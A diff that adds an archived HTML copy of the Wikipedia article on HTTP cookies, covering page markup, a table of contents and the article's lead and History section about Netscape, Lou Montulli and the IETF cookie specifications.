@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" >
+<title>HTTP cookie - Wikipedia, the free encyclopedia</title>
+<meta charset="UTF-8" />
+<meta name="generator" content="MediaWiki 1.21wmf9" />
+<link rel="alternate" type="application/x-wiki" title="Edit this page" href="../../w/index-title=HTTP_cookie&action=edit.php.html" />
+<link rel="edit" title="Edit this page" href="../../w/index-title=HTTP_cookie&action=edit.php.html" />
+<link rel="apple-touch-icon" href="http://en.wikipedia.org/apple-touch-icon.png" />
+<link rel="shortcut icon" href="http://en.wikipedia.org/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../../w/opensearch_desc.php.html" title="Wikipedia (en)" />
+<link rel="EditURI" type="application/rsd+xml" href="../../w/api-action=rsd.php.html" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="Wikipedia Atom feed" href="../../w/index-title=Special_RecentChanges&feed=atom.php.html" />
+<link rel="stylesheet" href="http://bits.wikimedia.org/en.wikipedia.org/load.php?debug=false&lang=en&modules=ext.gadget.DRN-wizard,ReferenceTooltips,charinsert,teahouse%7Cext.geshi.local%7Cext.wikihiero%7Cmediawiki.legacy.commonPrint,shared%7Cmw.PopUpMediaTransform%7Cskins.vector&only=styles&skin=vector&*" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<link rel="stylesheet" href="http://bits.wikimedia.org/en.wikipedia.org/load.php?debug=false&lang=en&modules=site&only=styles&skin=vector&*" />
+<style>a:lang(ar),a:lang(ckb),a:lang(fa),a:lang(kk-arab),a:lang(mzn),a:lang(ps),a:lang(ur){text-decoration:none}
+/* cache key: enwiki:resourceloader:filter:minify-css:7:d11e4771671c2d6cdedf7c90d8131cd5 */</style>
+
+<script src="http://bits.wikimedia.org/en.wikipedia.org/load.php?debug=false&lang=en&modules=startup&only=scripts&skin=vector&*"></script>
+<script>if(window.mw){
+mw.config.set({"wgCanonicalNamespace":"","wgCanonicalSpecialPageName":false,"wgNamespaceNumber":0,"wgPageName":"HTTP_cookie","wgTitle":"HTTP cookie","wgCurRevisionId":538082318,"wgArticleId":5068415,"wgIsArticle":true,"wgAction":"view","wgUserName":null,"wgUserGroups":["*"],"wgCategories":["Articles needing additional references from August 2011","All articles needing additional references","Articles that may contain original research from September 2011","All articles that may contain original research","Articles needing additional references from September 2011","Wikipedia articles needing clarification from August 2011","Spoken articles","Articles with hAudio microformats","Web security exploits","HTTP","HTTP headers","Internet privacy","Wikipedia articles with ASCII art","Computer access control"],"wgBreakFrames":false,"wgPageContentLanguage":"en","wgSeparatorTransformTable":["",""],"wgDigitTransformTable":["",""],"wgDefaultDateFormat":"dmy","wgMonthNames":["","January","February","March","April","May","June","July","August","September","October","November","December"],"wgMonthNamesShort":["","Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"wgRelevantPageName":"HTTP_cookie","wgRestrictionEdit":[],"wgRestrictionMove":[],"wgVectorEnabledModules":{"collapsiblenav":true,"collapsibletabs":true,"editwarning":true,"expandablesearch":false,"footercleanup":true,"sectioneditlinks":false,"experiments":true},"wgWikiEditorEnabledModules":{"toolbar":true,"dialogs":true,"hidesig":true,"templateEditor":false,"templates":false,"preview":false,"previewDialog":false,"publish":false,"toc":false},"wgTrackingToken":"7ab95e3d2e8f543df7ecc7553bfde2d8","wgArticleFeedbackv5Permissions":{"aft-reader":true,"aft-member":false,"aft-editor":false,"aft-monitor":false,"aft-administrator":false,"aft-oversighter":false},"wgVisualEditor":{"isPageWatched":false,"enableSectionEditLinks":false},"wikilove-recipient":"","wikilove-anon":0,"wgGuidedTourHelpUrl":"Help:Guided tours","wgGuidedTourTestWikitextDescription":"A guider in your on-wiki tour can contain wikitext using onShow and parseDescription. Use it to create a wikilink to the \x3ca href=\"/wiki/Help:Guided_tours\" title=\"Help:Guided tours\"\x3eGuided tours documentation\x3c/a\x3e. Or an external link \x3ca rel=\"nofollow\" class=\"external text\" href=\"https://github.com/tychay/mwgadget.GuidedTour\"\x3eto GitHub\x3c/a\x3e, for instance.","wgFlaggedRevsParams":{"tags":{"status":{"levels":1,"quality":2,"pristine":3}}},"wgStableRevisionId":null,"wgCategoryTreePageCategoryOptions":"{\"mode\":0,\"hideprefix\":20,\"showcount\":true,\"namespaces\":false}","Geo":{"city":"","country":""},"wgNoticeProject":"wikipedia","aftv5Article":{"id":5068415,"title":"HTTP cookie","namespace":0,"categories":["All articles needing additional references","All articles that may contain original research","Articles needing additional references from August 2011","Articles needing additional references from September 2011","Articles that may contain original research from September 2011","Articles with hAudio microformats","Computer access control","HTTP","HTTP headers","Internet privacy","Spoken articles","Web security exploits","Wikipedia articles needing clarification from August 2011","Wikipedia articles with ASCII art"],"permissionLevel":"aft-reader"}});
+}</script><script>if(window.mw){
+mw.loader.implement("user.options",function(){mw.user.options.set({"ccmeonemails":0,"cols":80,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"imagesize":2,"justify":0,"math":0,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":5,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":false,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":4,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":1,"watchdefault":0,"watchdeletion":0,"watchlistdays":3
+,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"flaggedrevssimpleui":1,"flaggedrevsstable":0,"flaggedrevseditdiffs":true,"flaggedrevsviewdiffs":false,"vector-simplesearch":1,"useeditwarning":1,"vector-collapsiblenav":1,"usebetatoolbar":1,"usebetatoolbar-cgd":1,"aftv5-last-filter":null,"wikilove-enabled":1,"echo-email-notificationspagetriage-mark-as-reviewed":true,"echo-email-notificationspagetriage-add-maintenance-tag":true,"echo-email-notificationspagetriage-add-deletion-tag":true,"ep_showtoplink":false,"ep_bulkdelorgs":false,"ep_bulkdelcourses":true,"ep_showdyk":true,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false
+,"searchNs15":false,"searchNs100":false,"searchNs101":false,"searchNs108":false,"searchNs109":false,"searchNs446":false,"searchNs447":false,"searchNs710":false,"searchNs711":false,"gadget-teahouse":1,"gadget-ReferenceTooltips":1,"gadget-HotCat":1,"gadget-DRN-wizard":1,"gadget-charinsert":1,"gadget-mySandbox":1});;},{},{});mw.loader.implement("user.tokens",function(){mw.user.tokens.set({"editToken":"+\\","patrolToken":false,"watchToken":false});;},{},{});
+/* cache key: enwiki:resourceloader:filter:minify-js:7:19e64e7d3e84450cdd6aaeece6e56fab */
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.page.startup","mediawiki.legacy.wikibits","mediawiki.legacy.ajax","ext.vector.footerCleanup","ext.wikimediaShopLink.core","ext.centralNotice.bannerController"]);
+}</script>
+<style type="text/css">/*<![CDATA[*/
+.source-html5 {line-height: normal;}
+.source-html5 li, .source-html5 pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for html5
+ * CSS class: source-html5, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.html5.source-html5 .de1, .html5.source-html5 .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
+.html5.source-html5  {font-family:monospace;}
+.html5.source-html5 .imp {font-weight: bold; color: red;}
+.html5.source-html5 li, .html5.source-html5 .li1 {font-weight: normal; vertical-align:top;}
+.html5.source-html5 .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.html5.source-html5 .li2 {font-weight: bold; vertical-align:top;}
+.html5.source-html5 .kw2 {color: #000000; font-weight: bold;}
+.html5.source-html5 .kw3 {color: #000066;}
+.html5.source-html5 .es0 {color: #000099; font-weight: bold;}
+.html5.source-html5 .br0 {color: #66cc66;}
+.html5.source-html5 .sy0 {color: #66cc66;}
+.html5.source-html5 .st0 {color: #ff0000;}
+.html5.source-html5 .nu0 {color: #cc66cc;}
+.html5.source-html5 .sc-2 {color: #404040;}
+.html5.source-html5 .sc-1 {color: #808080; font-style: italic;}
+.html5.source-html5 .sc0 {color: #00bbdd;}
+.html5.source-html5 .sc1 {color: #ddbb00;}
+.html5.source-html5 .sc2 {color: #009900;}
+.html5.source-html5 .ln-xtra, .html5.source-html5 li.ln-xtra, .html5.source-html5 div.ln-xtra {background-color: #ffc;}
+.html5.source-html5 span.xtra { display:block; }
+
+/*]]>*/
+</style><style type="text/css">/*<![CDATA[*/
+.source-xml {line-height: normal;}
+.source-xml li, .source-xml pre {
+	line-height: normal; border: 0px none white;
+}
+/**
+ * GeSHi Dynamically Generated Stylesheet
+ * --------------------------------------
+ * Dynamically generated stylesheet for xml
+ * CSS class: source-xml, CSS id: 
+ * GeSHi (C) 2004 - 2007 Nigel McNie, 2007 - 2008 Benny Baumann
+ * (http://qbnz.com/highlighter/ and http://geshi.org/)
+ * --------------------------------------
+ */
+.xml.source-xml .de1, .xml.source-xml .de2 {font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;}
+.xml.source-xml  {font-family:monospace;}
+.xml.source-xml .imp {font-weight: bold; color: red;}
+.xml.source-xml li, .xml.source-xml .li1 {font-weight: normal; vertical-align:top;}
+.xml.source-xml .ln {width:1px;text-align:right;margin:0;padding:0 2px;vertical-align:top;}
+.xml.source-xml .li2 {font-weight: bold; vertical-align:top;}
+.xml.source-xml .es0 {color: #000099; font-weight: bold;}
+.xml.source-xml .br0 {color: #66cc66;}
+.xml.source-xml .sy0 {color: #66cc66;}
+.xml.source-xml .st0 {color: #ff0000;}
+.xml.source-xml .nu0 {color: #cc66cc;}
+.xml.source-xml .sc-1 {color: #808080; font-style: italic;}
+.xml.source-xml .sc0 {color: #00bbdd;}
+.xml.source-xml .sc1 {color: #ddbb00;}
+.xml.source-xml .sc2 {color: #339933;}
+.xml.source-xml .sc3 {color: #009900;}
+.xml.source-xml .re0 {color: #000066;}
+.xml.source-xml .re1 {color: #000000; font-weight: bold;}
+.xml.source-xml .re2 {color: #000000; font-weight: bold;}
+.xml.source-xml .ln-xtra, .xml.source-xml li.ln-xtra, .xml.source-xml div.ln-xtra {background-color: #ffc;}
+.xml.source-xml span.xtra { display:block; }
+
+/*]]>*/
+</style><script src="http://bits.wikimedia.org/geoiplookup"></script><link rel="dns-prefetch" href="http://meta.wikimedia.org" /><!--[if lt IE 7]><style type="text/css">body{behavior:url("../../w/skins-1.21wmf9/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-HTTP_cookie skin-vector action-view vector-animateLayout">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content" class="mw-body" role="main">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- sitenotice -->
+			<div id="siteNotice"><!-- CentralNotice --><script>
+	mw.loader.using( 'ext.centralNotice.bannerController', function() { mw.centralNotice.initialize(); } );
+</script>
+</div>
+			<!-- /sitenotice -->
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading" lang="en"><span dir="auto">HTTP cookie</span></h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+								<!-- tagline -->
+				<div id="siteSub">From Wikipedia, the free encyclopedia</div>
+				<!-- /tagline -->
+								<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav" class="mw-jump">
+					Jump to:					<a href="#mw-head">navigation</a>, 					<a href="#p-search">search</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodycontent -->
+				<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><table class="vertical-navbox nowraplinks hlist" cellspacing="5" cellpadding="0" style="float:right;clear:right;width:22.0em;margin:0 0 1.0em 1.0em;background:#f9f9f9;border:1px solid #aaa;padding:0.2em;border-spacing:0.4em 0;text-align:center;line-height:1.4em;font-size:88%;">
+<tr>
+<th class="" style=";padding:0.2em 0.4em 0.2em;;font-size:145%;line-height:1.2em;"><a href="Hypertext_Transfer_Protocol" title="Hypertext Transfer Protocol">HTTP</a></th>
+</tr>
+<tr>
+<td class="" style="padding:0 0.1em 0.4em;&#160;;">
+<ul>
+<li><a href="HTTP_persistent_connection" title="HTTP persistent connection">Persistence</a></li>
+<li><a href="HTTP_compression" title="HTTP compression">Compression</a></li>
+<li><a href="HTTP_Secure" title="HTTP Secure">HTTPS</a></li>
+</ul>
+</td>
+</tr>
+<tr>
+<th class="" style="padding:0.1em;;;"><a href="Hypertext_Transfer_Protocol#Request_methods" title="Hypertext Transfer Protocol">Request methods</a></th>
+</tr>
+<tr>
+<td class="" style="padding:0 0.1em 0.4em;&#160;;">
+<ul>
+<li><a href="OPTIONS_(HTTP)" title="OPTIONS (HTTP)" class="mw-redirect">OPTIONS</a></li>
+<li><a href="Hypertext_Transfer_Protocol#Request_methods" title="Hypertext Transfer Protocol">GET</a></li>
+<li><a href="HEAD_(HTTP)" title="HEAD (HTTP)" class="mw-redirect">HEAD</a></li>
+<li><a href="POST_(HTTP)" title="POST (HTTP)">POST</a></li>
+<li><a href="PUT_(HTTP)" title="PUT (HTTP)" class="mw-redirect">PUT</a></li>
+<li><a href="DELETE_(HTTP)" title="DELETE (HTTP)" class="mw-redirect">DELETE</a></li>
+<li><a href="TRACE_(HTTP)" title="TRACE (HTTP)" class="mw-redirect">TRACE</a></li>
+<li><a href="CONNECT_(HTTP)" title="CONNECT (HTTP)" class="mw-redirect">CONNECT</a></li>
+<li><a href="PATCH_(HTTP)" title="PATCH (HTTP)" class="mw-redirect">PATCH</a></li>
+</ul>
+</td>
+</tr>
+<tr>
+<th class="" style="padding:0.1em;;;"><a href="List_of_HTTP_header_fields" title="List of HTTP header fields">Header fields</a></th>
+</tr>
+<tr>
+<td class="" style="padding:0 0.1em 0.4em;&#160;;">
+<ul>
+<li><strong class="selflink">Cookie</strong></li>
+<li><a href="HTTP_ETag" title="HTTP ETag">ETag</a></li>
+<li><a href="HTTP_location" title="HTTP location">Location</a></li>
+<li><a href="HTTP_referer" title="HTTP referer">HTTP referer</a></li>
+<li><a href="Do_Not_Track" title="Do Not Track">DNT</a></li>
+<li><a href="X-Forwarded-For" title="X-Forwarded-For">X-Forwarded-For</a></li>
+</ul>
+</td>
+</tr>
+<tr>
+<th class="" style="padding:0.1em;;;"><a href="List_of_HTTP_status_codes" title="List of HTTP status codes">Status codes</a></th>
+</tr>
+<tr>
+<td class="" style="padding:0 0.1em 0.4em;&#160;;">
+<ul>
+<li><a href="HTTP_301" title="HTTP 301">301 Moved permanently</a></li>
+<li><a href="HTTP_302" title="HTTP 302">302 Found</a></li>
+<li><a href="HTTP_303" title="HTTP 303">303 See Other</a></li>
+<li><a href="HTTP_403" title="HTTP 403">403 Forbidden</a></li>
+<li><a href="HTTP_404" title="HTTP 404">404 Not Found</a></li>
+</ul>
+</td>
+</tr>
+<tr>
+<td style="text-align:right;font-size:115%;">
+<div class="noprint plainlinks hlist navbar mini" style="">
+<ul>
+<li class="nv-view"><a href="Template_HTTP" title="Template:HTTP"><span title="View this template" style="">v</span></a></li>
+<li class="nv-talk"><a href="Template_talk_HTTP" title="Template talk:HTTP"><span title="Discuss this template" style="">t</span></a></li>
+<li class="nv-edit"><a class="external text" href="../../w/index-title=Template_HTTP&action=edit.php.html"><span title="Edit this template" style="">e</span></a></li>
+</ul>
+</div>
+</td>
+</tr>
+</table>
+<p>A <b>cookie</b>, also known as an <b>HTTP cookie</b>, <b>web cookie</b>, or <b>browser cookie</b>, is usually a small piece of data sent from a website and stored in a user's <a href="Web_browser" title="Web browser">web browser</a> while a user is browsing a website. When the user browses the same website in the future, the data stored in the cookie can be retrieved by the website to notify the website of the user's previous activity.<sup id="cite_ref-1" class="reference"><a href="#cite_note-1"><span>[</span>1<span>]</span></a></sup> Cookies were designed to be a reliable mechanism for websites to remember the <a href="Program_state" title="Program state" class="mw-redirect">state</a> of the website or activity the user had taken in the past. This can include clicking particular buttons, <a href="Authentication" title="Authentication">logging in</a>, or a record of which pages were visited by the user even months or years ago.</p>
+<p>Although cookies cannot carry <a href="Virus_(computer)" title="Virus (computer)" class="mw-redirect">viruses</a>, and cannot install <a href="Malware" title="Malware">malware</a> on the host computer,<sup id="cite_ref-2" class="reference"><a href="#cite_note-2"><span>[</span>2<span>]</span></a></sup> <b>tracking cookies</b> and especially <b>third-party tracking cookies</b> are commonly used as ways to compile long-term records of individuals' browsing histories — a major <a href="Internet_privacy#HTTP_cookies" title="Internet privacy">privacy concern</a> that prompted European and US law makers to take action in 2011.<sup id="cite_ref-eulaw_3-0" class="reference"><a href="#cite_note-eulaw-3"><span>[</span>3<span>]</span></a></sup><sup id="cite_ref-4" class="reference"><a href="#cite_note-4"><span>[</span>4<span>]</span></a></sup></p>
+<p>Other kinds of cookies perform essential functions in the modern Web. Perhaps most importantly, <b>authentication cookies</b> are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in under. Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate himself by logging in. The security of an authentication cookie generally depends on the security of the issuing website and the user's <a href="Comparison_of_web_browsers#Vulnerabilities" title="Comparison of web browsers">web browser</a>, and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by a <a href="Hacker_(computer_security)" title="Hacker (computer security)">hacker</a>, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see <a href="Cross-site_scripting" title="Cross-site scripting">cross-site scripting</a> and <a href="Cross-site_request_forgery" title="Cross-site request forgery">cross-site request forgery</a> for examples).<sup id="cite_ref-5" class="reference"><a href="#cite_note-5"><span>[</span>5<span>]</span></a></sup></p>
+<table id="toc" class="toc">
+<tr>
+<td>
+<div id="toctitle">
+<h2>Contents</h2>
+</div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="#History"><span class="tocnumber">1</span> <span class="toctext">History</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="#Terminology"><span class="tocnumber">2</span> <span class="toctext">Terminology</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="#Session_cookie"><span class="tocnumber">2.1</span> <span class="toctext">Session cookie</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="#Persistent_cookie"><span class="tocnumber">2.2</span> <span class="toctext">Persistent cookie</span></a></li>
+<li class="toclevel-2 tocsection-5"><a href="#Secure_cookie"><span class="tocnumber">2.3</span> <span class="toctext">Secure cookie</span></a></li>
+<li class="toclevel-2 tocsection-6"><a href="#HttpOnly_cookie"><span class="tocnumber">2.4</span> <span class="toctext">HttpOnly cookie</span></a></li>
+<li class="toclevel-2 tocsection-7"><a href="#Third-party_cookie"><span class="tocnumber">2.5</span> <span class="toctext">Third-party cookie</span></a></li>
+<li class="toclevel-2 tocsection-8"><a href="#Supercookie"><span class="tocnumber">2.6</span> <span class="toctext">Supercookie</span></a></li>
+<li class="toclevel-2 tocsection-9"><a href="#Zombie_cookie"><span class="tocnumber">2.7</span> <span class="toctext">Zombie cookie</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-10"><a href="#Uses"><span class="tocnumber">3</span> <span class="toctext">Uses</span></a>
+<ul>
+<li class="toclevel-2 tocsection-11"><a href="#Session_management"><span class="tocnumber">3.1</span> <span class="toctext">Session management</span></a></li>
+<li class="toclevel-2 tocsection-12"><a href="#Personalization"><span class="tocnumber">3.2</span> <span class="toctext">Personalization</span></a></li>
+<li class="toclevel-2 tocsection-13"><a href="#Tracking"><span class="tocnumber">3.3</span> <span class="toctext">Tracking</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-14"><a href="#Implementation"><span class="tocnumber">4</span> <span class="toctext">Implementation</span></a>
+<ul>
+<li class="toclevel-2 tocsection-15"><a href="#Setting_a_cookie"><span class="tocnumber">4.1</span> <span class="toctext">Setting a cookie</span></a></li>
+<li class="toclevel-2 tocsection-16"><a href="#Cookie_attributes"><span class="tocnumber">4.2</span> <span class="toctext">Cookie attributes</span></a>
+<ul>
+<li class="toclevel-3 tocsection-17"><a href="#Domain_and_Path"><span class="tocnumber">4.2.1</span> <span class="toctext">Domain and Path</span></a></li>
+<li class="toclevel-3 tocsection-18"><a href="#Expires_and_Max-Age"><span class="tocnumber">4.2.2</span> <span class="toctext">Expires and Max-Age</span></a></li>
+<li class="toclevel-3 tocsection-19"><a href="#Secure_and_HttpOnly"><span class="tocnumber">4.2.3</span> <span class="toctext">Secure and HttpOnly</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-20"><a href="#Browser_settings"><span class="tocnumber">5</span> <span class="toctext">Browser settings</span></a></li>
+<li class="toclevel-1 tocsection-21"><a href="#Privacy_and_third-party_cookies"><span class="tocnumber">6</span> <span class="toctext">Privacy and third-party cookies</span></a>
+<ul>
+<li class="toclevel-2 tocsection-22"><a href="#EU_Cookie_Law"><span class="tocnumber">6.1</span> <span class="toctext">EU Cookie Law</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-23"><a href="#Cookie_theft_and_session_hijacking"><span class="tocnumber">7</span> <span class="toctext">Cookie theft and session hijacking</span></a>
+<ul>
+<li class="toclevel-2 tocsection-24"><a href="#Network_eavesdropping"><span class="tocnumber">7.1</span> <span class="toctext">Network eavesdropping</span></a></li>
+<li class="toclevel-2 tocsection-25"><a href="#Publishing_false_sub-domain_.E2.80.93_DNS_cache_poisoning"><span class="tocnumber">7.2</span> <span class="toctext">Publishing false sub-domain – DNS cache poisoning</span></a></li>
+<li class="toclevel-2 tocsection-26"><a href="#Cross-site_scripting_.E2.80.93_cookie_theft"><span class="tocnumber">7.3</span> <span class="toctext">Cross-site scripting – cookie theft</span></a></li>
+<li class="toclevel-2 tocsection-27"><a href="#Cross-site_scripting"><span class="tocnumber">7.4</span> <span class="toctext">Cross-site scripting</span></a></li>
+<li class="toclevel-2 tocsection-28"><a href="#Cross-site_scripting_.E2.80.93_proxy_request"><span class="tocnumber">7.5</span> <span class="toctext">Cross-site scripting – proxy request</span></a></li>
+<li class="toclevel-2 tocsection-29"><a href="#Cross-site_request_forgery"><span class="tocnumber">7.6</span> <span class="toctext">Cross-site request forgery</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-30"><a href="#Drawbacks_of_cookies"><span class="tocnumber">8</span> <span class="toctext">Drawbacks of cookies</span></a>
+<ul>
+<li class="toclevel-2 tocsection-31"><a href="#Inaccurate_identification"><span class="tocnumber">8.1</span> <span class="toctext">Inaccurate identification</span></a></li>
+<li class="toclevel-2 tocsection-32"><a href="#Inconsistent_state_on_client_and_server"><span class="tocnumber">8.2</span> <span class="toctext">Inconsistent state on client and server</span></a></li>
+<li class="toclevel-2 tocsection-33"><a href="#Inconsistent_support_by_devices"><span class="tocnumber">8.3</span> <span class="toctext">Inconsistent support by devices</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-34"><a href="#Alternatives_to_cookies"><span class="tocnumber">9</span> <span class="toctext">Alternatives to cookies</span></a>
+<ul>
+<li class="toclevel-2 tocsection-35"><a href="#IP_address"><span class="tocnumber">9.1</span> <span class="toctext">IP address</span></a></li>
+<li class="toclevel-2 tocsection-36"><a href="#URL_.28query_string.29"><span class="tocnumber">9.2</span> <span class="toctext">URL (query string)</span></a></li>
+<li class="toclevel-2 tocsection-37"><a href="#Hidden_form_fields"><span class="tocnumber">9.3</span> <span class="toctext">Hidden form fields</span></a></li>
+<li class="toclevel-2 tocsection-38"><a href="#window.name"><span class="tocnumber">9.4</span> <span class="toctext">window.name</span></a></li>
+<li class="toclevel-2 tocsection-39"><a href="#HTTP_authentication"><span class="tocnumber">9.5</span> <span class="toctext">HTTP authentication</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-40"><a href="#See_also"><span class="tocnumber">10</span> <span class="toctext">See also</span></a></li>
+<li class="toclevel-1 tocsection-41"><a href="#References"><span class="tocnumber">11</span> <span class="toctext">References</span></a></li>
+<li class="toclevel-1 tocsection-42"><a href="#External_links"><span class="tocnumber">12</span> <span class="toctext">External links</span></a></li>
+</ul>
+</td>
+</tr>
+</table>
+<h2><span class="editsection">[<a href="../../w/index-title=HTTP_cookie&action=edit&section=1.php.html" title="Edit section: History">edit</a>]</span> <span class="mw-headline" id="History">History</span></h2>
+<p>The term "cookie" was derived from "<a href="Magic_cookie" title="Magic cookie">magic cookie</a>", which is the packet of data a program receives and sends again unchanged. Magic cookies were already used in computing when computer programmer <a href="Lou_Montulli" title="Lou Montulli">Lou Montulli</a> had the idea of using them in Web communications in June 1994.<sup id="cite_ref-6" class="reference"><a href="#cite_note-6"><span>[</span>6<span>]</span></a></sup> At the time, he was an employee of <a href="Netscape_Communications" title="Netscape Communications" class="mw-redirect">Netscape Communications</a>, which was developing an <a href="E-commerce" title="E-commerce">e-commerce</a> application for a customer. The customer was MCI and the application was the "MCI Mall". Vint Cerf and John Klensin represented MCI in technical discussions with Netscape Communications. Not wanting the MCI Mall servers to have to retain partial transaction states led to MCI's request to Netscape to find a way to store that state in each user's computer. Cookies provided a solution to the problem of reliably implementing a <a href="Shopping_cart_software" title="Shopping cart software">virtual shopping cart</a>.<sup id="cite_ref-ks_7-0" class="reference"><a href="#cite_note-ks-7"><span>[</span>7<span>]</span></a></sup><sup id="cite_ref-kristol_8-0" class="reference"><a href="#cite_note-kristol-8"><span>[</span>8<span>]</span></a></sup></p>
+<p>Together with John Giannandrea, Montulli wrote the initial Netscape cookie specification the same year. Version 0.9beta of <a href="Netscape_Navigator" title="Netscape Navigator">Mosaic Netscape</a>, released on October 13, 1994,<sup id="cite_ref-9" class="reference"><a href="#cite_note-9"><span>[</span>9<span>]</span></a></sup><sup id="cite_ref-10" class="reference"><a href="#cite_note-10"><span>[</span>10<span>]</span></a></sup> supported cookies. The first use of cookies (out of the labs) was checking whether visitors to the Netscape website had already visited the site. Montulli applied for a patent for the cookie technology in 1995, and <span class="citation patent"><a rel="nofollow" class="external text" href="http://worldwide.espacenet.com/textdoc?DB=EPODOC&IDX=US5774670">US 5774670</a></span><span class="Z3988" title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Apatent&amp;rft.number=5774670&amp;rft.cc=US&amp;rft.title="><span style="display: none;">&#160;</span></span> was granted in 1998. Support for cookies was integrated in Internet Explorer in version 2, released in October 1995.<sup id="cite_ref-11" class="reference"><a href="#cite_note-11"><span>[</span>11<span>]</span></a></sup></p>
+<p>The introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of the presence of cookies. The general public learned about them after the <i><a href="Financial_Times" title="Financial Times">Financial Times</a></i> published an article about them on February 12, 1996.<sup id="cite_ref-12" class="reference"><a href="#cite_note-12"><span>[</span>12<span>]</span></a></sup> In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two <a href="U.S." title="U.S." class="mw-redirect">U.S.</a> <a href="Federal_Trade_Commission" title="Federal Trade Commission">Federal Trade Commission</a> hearings in 1996 and 1997.</p>
+<p>The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk mailing list. A special working group within the <a href="Internet_Engineering_Task_Force" title="Internet Engineering Task Force">IETF</a> was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by <a href="Brian_Behlendorf" title="Brian Behlendorf">Brian Behlendorf</a> and David Kristol respectively, but the group, headed by Kristol himself and Aron Afatsuom, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2109">RFC 2109</a> in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.</p>
+<p>At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2109">RFC 2109</a> was not followed by Netscape and Internet Explorer. <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2109">RFC 2109</a> was superseded by <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc2965">RFC 2965</a> in October 2000.</p>
+<p>A definitive specification for cookies as used in the real world was published as <a class="external mw-magiclink-rfc" rel="nofollow" href="http://tools.ietf.org/html/rfc6265">RFC 6265</a> in April 2011.</p>
